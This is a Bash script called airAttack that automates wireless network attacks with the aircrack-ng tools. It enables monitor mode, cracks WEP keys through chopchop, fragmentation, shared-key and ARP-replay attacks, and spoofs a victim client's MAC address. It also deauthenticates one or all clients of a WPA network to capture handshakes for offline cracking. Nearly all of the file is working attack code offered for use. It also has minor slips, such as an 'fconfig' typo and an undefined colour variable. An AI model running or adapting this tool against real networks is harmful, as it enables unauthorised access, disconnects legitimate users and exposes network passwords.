#!/bin/bash


#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


function banner(){
sleep 0.25
echo -e "${purpleColour}"
echo -e " █████╗ ██╗██████╗  █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗"
echo -e "██╔══██╗██║██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝"
sleep 0.020
echo -e "███████║██║██████╔╝███████║   ██║      ██║   ███████║██║     █████╔╝  ${endColour}${yellowColour}- Created by${endColour} ${blueColour}Eric Labrador${endColour}${purpleColour}"
sleep 0.015
echo -e "██╔══██║██║██╔══██╗██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ "
echo -e "██║  ██║██║██║  ██║██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗"
sleep 0.010
echo -e "╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
echo -e "${endColour}"
}

function interfaces(){
#List all interfaces
        echo -e "\t ${blueColour}[i] ${endColour} ${yellowColour}Available Interfaces:${endColour}\n"
	ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > /tmp/iface
        for interface in $(cat /tmp/iface); do
		echo -e "\t\t${greenColour}[-]${endColour} ${yellowColour} $interface${endColour}\n"
	done;
	echo -ne "\t\t\t${redColour}[*]${endColour} ${yellowColour}Choose an interface:${endColour} " && read choosed_interface
	sleep 2
	airmon-ng start $choosed_interface >/dev/null 2>&1
	sleep 1
	echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour} Monitor Mode for interface $choosed_interface enabled succesfuly${endColour} "
	sleep 1
	#Completed
}

function user(){
	user1=$(echo -e "$(/usr/bin/whoami)")
	#Check if user root is running this script
	#Completed
	if [ $user1 == "root" ]; then
		echo -e "\n\t${blueColour}[i] ${endColour}${yellowColour}Running as root${endColour} \n" 2>/dev/null
		sleep 0.5
	else
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Please, run this program as root${endColour}\n" 2>/dev/null
		sleep 0.5
		exit 0
fi
}


function allNets(){
#List all Network bssid
	timeout 10 airodump-ng  wlx00c0caad0654 > /tmp/allNets.tmp
	cat prueba |tr -d ']' |awk '{print $1}' | sed 's/Quitting//g' |tr -d '.' |sort -u | tr -d ' ' > wepale

}

function dependencies(){
        sleep 1.5; counter=0
        echo -e "\n\t${blueColour}[i]${endColour}${yellowColour} Checking necessary programs to run this script${endColour} \n"
        sleep 1

        dependencias=(aircrack-ng airodump-ng aireplay-ng macchanger)

        for programa in "${dependencias[@]}"; do
                if [ "$(command -v $programa)" ]; then
                        echo -e "\t\t${redColour}[*]${endColour}${yellowColour} Tool ${grayColour}$programa ${endColour}${yellowColour} is installed\n"
                        let counter+=1
                else
                        echo -e "\t${redColour}[E]${endColour}${yellowColour} Tool${endColour}${grayColour} $programa${endColour}${yellowColour} is not installed"
                fi; sleep 0.4
        done

        if [ "$(echo $counter)" == "4" ]; then
                echo -e "\n\t${blueColour}[i]${endColour}${yellowColour} Starting...\n${endColour}"
		sleep 3
        else
                echo -e "\n\t${blueColour}[i]${endColour}${yellowColour} Es necesario tener las herramientas ${grayColour}aircrack-ng${endColour}${yellowColour},${endColour}${grayColour}airodump-ng${endColour}${yellowColour},${endColour} ${grayColour}aireplay-ng${endColour} ${yellowColour}y${endColour} ${grayColour}macchanger${endColour} ${yellowColour}instaladas para ejecutar este script${endColour}\n"
                exit 0
        fi
}

function checkAllNetworks(){
	gnome-terminal -x sh -c "airodump-ng $choosed_interface" &disown
}

########################################################################
############################WEP Attacks#################################
########################################################################

#Function to run chopchop Attack
function chopchop(){
	if [ $wep_attack == "1" ]; then
		mac=$(macchanger -s $choosed_interface | head -n 1 | awk '{print $3}')
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Start sniffing traffic...${endColour}"
		gnome-terminal -x sh -c "airodump-ng -c $choosed_channel --bssid $choosed_bssid -w Captura $choosed_interface" 2>/dev/null &disown
		sleep 2
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Authenticating fake client...${endColour}"
		gnome-terminal -x sh -c "aireplay-ng -1 6000 -o 1 -q 10 -a $choosed_bssid -h $mac $choosed_interface" &disown
		sleep 10
		if [ $frag_fake == "n" ]; then
                	gnome-terminal -x sh -c "aireplay-ng -1 6000 -o 1 -q 10 -a $choosed_bssid -h $mac $choosed_interface" &disown
                else
			sleep 2
			clear
			banner
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Started chopchop attack attack...${endColour}"
			gnome-terminal -x sh -c "aireplay-ng -4 -a $choosed_bssid -h $mac $choosed_interface" &disown
			gnome-terminal -x sh -c "packetforge-ng -0 -a $choosed_bssid -h $mac -l 192.168.1.113 -k 192.168.1.255 -y *.xor -w attack" &disown
			echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter when the fragmentation attack file is created.:${endColour} " && read
			sleep 3
			clear
			banner
			sleep 2
			echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Sending encripted packet to AP:${endColour} "
			gnome-terminal -x sh -c "aireplay-ng -2 -r attack $choosed_interface 2>/dev/null" &disown
			sleep 5
			gnome-terminal -x sh -c "aircrack-ng Captura-01.cap 2>/dev/null" &disown
			echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter when aircrack-ng crack the password:${endColour} " && read
		fi
	fi
}

#Function to run SKA Attack
function ska(){
	if [ $wep_attack == "3" ]; then
		clear
		banner
		sleep 2
		mac=$(macchanger -s $choosed_interface | head -n 1 | awk '{print $3}')
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Network overvirew...${endColour}"
		gnome-terminal -x sh -c "airodump-ng --bssid $choosed_bssid -c $choosed_channel $choosed_interface" 2>/dev/null &disown
		sleep 2
		clear
		banner
		sleep 0.25
		echo -ne "\n\t${redColour}[*]${endColour} ${yellowColour}Enter vulnerable client:${endColour} " && read vulnerable_client_ska
		echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter to follow with the program when the terminal launched is deleted:${endColour} " && read
		sleep 2
		clear
		banner
		sleep 2
		echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Changing $choosed_interface mac...${endColour}\n"
		ifconfig $choosed_interface down &> /dev/null && macchanger --mac $vulnerable_client_ska $choosed_interface &> /dev/null && ifconfig $choosed_interface up &> /dev/null
		ifconfig $choosed_interface down &> /dev/null && macchanger --mac $vulnerable_client_ska $choosed_interface &> /dev/null && ifconfig $choosed_interface up &> /dev/null
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Mac changed succesfully to $vulnerable_client_ska ${endColour}"
		sleep 2
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Sending arp requests...${endColour}"
		gnome-terminal -x sh -c "aireplay-ng -3 -b $choosed_bssid -h $vulnerable_client_ska $choosed_interface" 2>/dev/null &disown
		sleep 2
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Start sniffing traffic...${endColour}"
		gnome-terminal -x sh -c "airodump-ng -w Captura --bssid $choosed_bssid -c $choosed_channel $choosed_interface" 2>/dev/null &disown
		sleep 2
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Deauthenticating real client...${endColour}"
		gnome-terminal -x sh -c "aireplay-ng -0 1 -e $choosed_essid -a $choosed_bssid -h $vulnerable_client_ska $choosed_interface" 2>/dev/null &disown
		sleep 2
		echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}You want to deauthenticate real client because no IVS & ARP traffic is not generated?[y/n]:${endColour} " && read ska_question
		if [ $ska_question == "y" ]; then
			sleep 2
			clear
			banner
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Deauthenticating real client again...${endColour}"
			gnome-terminal -x sh -c "aireplay-ng -0 1 -e $choosed_essid -a $choosed_bssid -h $vulnerable_client_ska $choosed_interface" 2>/dev/null &disown
			sleep 2
			clear
			banner
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Authenticating fake client...${endColour}"
			gnome-terminal -x sh -c "aireplay-ng -1 6000 -o 1 -q 10 -a $choosed_bssid -h $vulnerable_client_ska $choosed_interface" 2>/dev/null &disown
			sleep 2
			clear
			banner
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Cracking WEP key...${endColour}"
			gnome-terminal -x sh -c "aircrack-ng Captura-01.cap"
			sleep 2
			clear
			banner
			sleep 2
                        echo -ne "\n\t\t${blueColour}[i]${endColour} ${yellowColour}Press enter when aircrack finish cracking WEP password${endColour}" && read
                        echo -e "\n\t\t${blueColour}[i]${endColour} ${yellowColour}Press enter to change $choosed_interface MAC to old MAC${endColour}"
                        ifconfig $choosed_interface down &> /dev/null && macchanger -p $choosed_interface &> /dev/null && ifconfig $choosed_interface up &> /dev/null
                        fconfig $choosed_interface down &> /dev/null && macchanger -p $choosed_interface &> /dev/null && ifconfig $choosed_interface up &> /dev/null
		else
			sleep 2
			clear
			banner
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Cracking WEP key...${endColour}"
			gnome-terminal -x sh -c "aircrack-ng Captura-01.cap"
			echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter when aircrack finish cracking WEP password${endColour}" && read
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter to change $choosed_interface MAC to old MAC${endColour}"
			ifconfig $choosed_interface down &> /dev/null && macchanger -p $choosed_interface &> /dev/null && ifconfig $choosed_interface up &> /dev/null
			fconfig $choosed_interface down &> /dev/null && macchanger -p $choosed_interface &> /dev/null && ifconfig $choosed_interface up &> /dev/null
		fi
	fi
}

#Function to run Arp Replay Attack
function arp(){
	if [ $wep_attack == "4" ]; then
		mac=$(macchanger -s $choosed_interface | head -n 1 | awk '{print $3}')
		clear
		banner
		sleep 2
		gnome-terminal -x sh -c "airodump-ng --bssid $choosed_bssid -c $choosed_channel $choosed_interface" 2>/dev/null &disown
		echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Select the client [STATION] you want to reauthenticate to generate ARP traffic:${endColour} " && read arp_deauth
		echo -ne "\n\t\t${redColour}[*]${endColour} ${yellowColour}If you entered correctly the vulnerable client, delete the terminal and press enter to keep with the attack:${endColour} " && read
		sleep 2
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Started sniffing packets...${endColour}"
		gnome-terminal -x sh -c "airodump-ng -w Captura --bssid $choosed_bssid -c $choosed_channel $choosed_interface" 2>/dev/null &disown
		sleep 2
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Running fake authentication attack...${endColour}"
		gnome-terminal -x sh -c "aireplay-ng -1 6000 -o 1 -q 10 -a $choosed_bssid -h $mac $choosed_interface" 2>/dev/null &disown
		sleep 2
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Generating ARP packets...${endColour}"
		gnome-terminal -x sh -c "aireplay-ng -3 -b $choosed_bssid -h $mac $choosed_interface" 2>/dev/null &disown
		sleep 2
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Deauthenticating real client...${endColour}"
		gnome-terminal -x sh -c "aireplay-ng -0 5 -a $choosed_bssid -c $arp_deauth $choosed_interface" 2>/dev/null &disown
		sleep 2
		clear
			for i in $(seq -s, 10 -1 1 | tr ',' '\n'); do
				echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Client should reconnect in $i...${endColour}" && sleep 1
        			clear
				banner
			done
		sleep 2
		clear
		banner
		sleep 2
		echo -ne "\n\t\t${redColour}[*]${endColour} ${yellowColour}Press enter when you want to run aircrack: ${endColour}" && read
		gnome-terminal -x sh -c "aircrack-ng Captura-01.cap" 2>/dev/null &disown
		echo -ne "\n\t${redColour}[*]${endColour} ${yellowColour}Press enter when aircrack finish cracking WEP key:${endColour} " && read
	fi
}


#Function to run fragmentation attack
function frag(){
	if [ $wep_attack == "2" ]; then
		mac=$(macchanger -s $choosed_interface | head -n 1 | awk '{print $3}')
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Start sniffing traffic...${endColour}"
		gnome-terminal -x sh -c "airodump-ng -w Captura  --bssid $choosed_bssid -c $choosed_channel $choosed_interface" 2>/dev/null &disown
		sleep 2
		clear
		banner
		sleep 2
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Authenticating fake client...${endColour}"
		gnome-terminal -x sh -c "aireplay-ng -1 6000 -o 1 -q 10 -a $choosed_bssid -h $mac $choosed_interface" &disown
		echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Did aircrack_ng authenticated fake client?[y/n]: ${endColour} " && read frag_fake
		if [ $frag_fake == "n" ]; then
			gnome-terminal -x sh -c "aireplay-ng -1 6000 -o 1 -q 10 -a $choosed_bssid -h $mac $choosed_interface" &disown
		else
			sleep 2
			clear
			banner
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Started fragmentation attack...${endColour}"
			gnome-terminal -x sh -c "aireplay-ng -5 -b $choosed_bssid -h $mac $choosed_interface" &disown
			echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter when the fragmentation attack file is created.:${endColour} " && read
			clear
			banner
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Creating packetforge file...${endColour}"
			sleep 10
			gnome-terminal -x sh -c "packetforge-ng -0 -a $choosed_bssid -h $mac -l 192.168.1.100 -k 192.168.1.255 -y *.xor -w attack.cap" &disown
			sleep 5
			echo -e "\n\t"
			echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter only when attack.cap file is completed:${endColour} " && read
			gnome-terminal -x sh -c "aireplay-ng -2 -r attack.cap $choosed_interface" &disown
			sleep 5
			gnome-terminal -x sh -c "aircrack-ng Captura-01.cap" &disown
			sleep 2
			echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter when aircrack-ng crack the password:${endColour} " && read
			exit 0
		fi
	fi
}

###############################################################
############################END WEP Attacks####################
###############################################################



function encription(){
	clear
	banner
	sleep 1
        echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Please, select the following attacks you want to perform [1 - 2]${endColour}"
        sleep 3
	clear
	banner
        echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}WEP Encription:${endColour} ${grayColour}1${endColour}"
        echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}WPA/WPA2 Encription:${endColour} ${grayColour}2${endColour}"
        echo -ne "\n\t\t${redColour}[*]${endColour} ${yellowColour}Encription:${endColour} " && read enc 2>/dev/null
	if [ $enc == "1"  ]; then
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}You Choosed WEP encription${endColour}"
		select_wep_Bssid
	else
		echo -e "\n\t\t${blueColour}[i]${endColour} ${yellowColour}You Choosed WPA/WPA2 encription${endColour}"
        	select_wpa_Bssid
	fi
	#First, choose the AP encription
	if [ $enc == "1" ]; then
		choose_wep
        elif [ $enc == "2" ]; then
		choose_wpa
	else
		exit 0
	fi
}

#Function to choose WPA Attacks
function choose_wpa(){
	sleep 0.25
	clear
	banner
	sleep 0.10
	echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Choose the attack you want to perform${endColour}"
	echo -e "\n\t\t${greenColour}[-]${endColour} ${yellowColour}Deauthentication Attack: ${endColour} ${grayColour}1${endColour}"
	echo -ne "\n\t\t\t${redColour}[*]${endColour} ${yellowColour}Attack: ${endColour}" && read wpa_attack 2>/dev/null
	if [ $wpa_attack == "1" ]; then
		deauth
	fi

}

###############################################################
########################START WPA Attacks######################
###############################################################
function deauth(){
	if [ $wpa_attack == "1" ]; then
		echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour} Please, select an option to run this attack...${endColour}"
		echo -ne "\n\t\t${redColour}[*]${endColour} ${yellowColour}You want to deauthenticate a single client${endColour} ${grayColour}[1]${endColour} ${yellowColour}or all clients connected${endColour} ${grayColour}[2]${endColour}${yellowColour}?:${endColour} " && read deauth_client
		if [ $deauth_client ==  "1" ]; then
			clear
			banner
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Single client deauthentication, started sniffing traffic...${endColour}"
			sleep 2
			gnome-terminal -x sh -c "airodump-ng -w Captura -c $choosed_channel --bssid $choosed_bssid $choosed_interface" 2>/dev/null &disown
			echo -ne "\n\t\t${redColour}[*]${endColour} ${yellowColour}Choose the client [STATION] you want to deauthenticate:${endColour} " && read single_deauth_client
			sleep 2
			echo -e "\n\t${blueColour}[i] ${yellowColour}Deautheticating $single_deauth_client...${endColour} "
			gnome-terminal -x sh -c "aireplay-ng -0 15 -a $choosed_bssid -h $single_deauth_client $choosed_interface" 2>/dev/null & disown
			for i in $(seq -s, 10 -1 1 | tr ',' '\n'); do
				clear
				banner
				echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Client should be authenticated in $i${endColour}" && sleep 1
			done
			clear
			banner
			sleep 2
			echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter when airodump-ng capture the handshake${endColour}" && read
			sleep 2
			clear
			banner
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Exporting hash to john format file...${endColour}"
			echo -e "\n\t${blueColour}[i]${endColour} ${redColour} run --> ${yellowColour}hccap2john miCaptura.hccap myHash${endColour}"
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${redColour} run --> ${endColour}${yellowColour}aircrack-ng -J miCaptura Captura-01.cap${endColour}"
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Hash succesfully exported, now you can crack it!${endColour}"
		else
	        	clear
                	banner
                	sleep 2
                	echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}All client deauthentication, started sniffing traffic...${endColour}"
                	sleep 2
                	gnome-terminal -x sh -c "airodump-ng -w Captura -c $choosed_channel --bssid $choosed_bssid $choosed_interface" 2>/dev/null &disown
			sleep 2
			clear
			banner
			sleep 2
			gnome-terminal -x sh -c "aireplay-ng -0 15 -a $choosed_bssid -h FF:FF:FF:FF:FF:FF $choosed_interface" 2>/dev/null & disown
                	for i in $(seq -s, 10 -1 1 | tr ',' '\n'); do
                        	clear
                        	banner
                        	echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Client should be authenticated in $i${endColour}" && sleep 1
                	done
			clear
			banner
			sleep 2
			echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour}Press enter when airodump-ng capture the handshake${endColour}" && read
			sleep 2
			clear
			banner
			sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Exporting hash to john format file...${endColour}"
                	sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${redColour} run --> ${endColour}${yellowColour}aircrack-ng -J miCaptura Captura-01.cap${endColour}"
			sleep 2
                	echo -e "\n\t${blueColour}[i]${endColour} ${redColour} run --> ${yellowColour}hccap2john miCaptura.hccap myHash${endColour}"
                	sleep 2
			echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Hash succesfully exported, now you can crack it!${endColour}"
		fi
	fi
}


#########################################################
###########################END WPA Attacks###############
#########################################################





function choose_wep(){

#WEP Encription
	sleep 0.25
	clear
	banner
	sleep 0.10
	echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Choose the attack you want to perform:${endColour} "
	echo -e "\n\t\t${greenColour}[-]${endColour} ${yellowColour}ChopChop Attack:${endColour} ${greyColour}1${endColour}"
	echo -e "\n\t\t${greenColour}[-]${endColour} ${yellowColour}Fragmentation Attack:${endColour} ${greyColour}2${endColour}"
	echo -e "\n\t\t${greenColour}[-]${endColour} ${yellowColour}Shared Key Authentication Attack:${endColour} ${greyColour}3${endColour}"
	echo -e "\n\t\t${greenColour}[-]${endColour} ${yellowColour}Arp Replay Attack: ${endColour} ${greyColour}4${endColour}"
	echo -ne "\n\t\t\t${redColour}[*]${endColour} ${yellowColour}Attack:${endColour} " && read wep_attack 2>/dev/null
	if [ $wep_attack == 1 ]; then
		chopchop
	elif [ $wep_attack == 2 ];then
		frag
	elif [ $wep_attack == 3 ]; then
		ska
	elif [ $wep_attack == 4 ]; then
		arp
	fi
}

#Function to select WEP BSSID
function select_wep_Bssid(){
	sleep 2
	clear
	banner
	echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Listing accesible WEP wireless AP...${endColour}"
	sleep 2
	gnome-terminal -x sh -c "airodump-ng --encrypt WEP $choosed_interface" 2>/dev/null &disown
	sleep 2
	echo -ne "\n\t\t${redColour}[*] ${endColour}${yellowColour}Choose a BSSID:${endColour} " && read choosed_bssid
	echo -ne "\n\t\t${redColour}[*]${endColour} ${yellowColour}Choose AP channel:${endColour} " && read choosed_channel
	echo -ne "\n\t\t${redColour}[*]${endColour} ${yellowColour}Choose AP ESSID:${endColour} " && read choosed_essid
	echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour} Please, when you finish to set above parameters, kill terminal created and press enter to keep running this program: " && read
	choose_wep
}

#Function to choose WPA BSSID
function select_wpa_Bssid(){
	sleep 2
	clear
	banner
	echo -e "\n\t${blueColour}[i]${endColour} ${yellowColour}Listing accesible WPA/WPA2 wireless AP...${endColour}"
	sleep 2
	gnome-terminal -x sh -c "airodump-ng --encrypt WPA $choosed_interface" 2>/dev/null &disown
        echo -ne "\n\t\t${redColour}[*] ${endColour}${yellowColour}Choose a BSSID:${endColour} " && read choosed_bssid
        echo -ne "\n\t\t${redColour}[*]${endColour} ${yellowColour}Choose AP channel:${endColour} " && read choosed_channel
        echo -ne "\n\t\t${redColour}[*]${endColour} ${yellowColour}Choose AP ESSID:${endColour} " && read choosed_essid
        echo -ne "\n\t${blueColour}[i]${endColour} ${yellowColour} Please, when you finish to set above parameters, kill terminal created and press enter to keep running this program: " && read
}


if [ $1 2>/dev/null = "run" ]; then
	clear
	banner
	dependencies
	clear
	banner
	user
	clear
	banner
	interfaces
	encription
	elif [ $1 2>/dev/null == "-h" ]; then
		clear
		banner
		echo -e "\t${blueColour}Options:${endColour}\n"
		echo -e "\t\t${blueColour}[i]${endColour} ${yellowColour}./airAttack.sh run \t\t: To run this program${endColour}\n"
		echo -e "\t\t${blueColour}[i]${endColour} ${yellowColour}-h \t\t\t\t: To show help panel${endColour}"
	else
		banner 2>/dev/null
		echo -e "\t\t${blueColour}[i]${endColour} ${yellowColour}Type${endColour} ${blueColour}-h${endColour} ${yellowColour}for help panel${endColour}."
		exit 0
fi
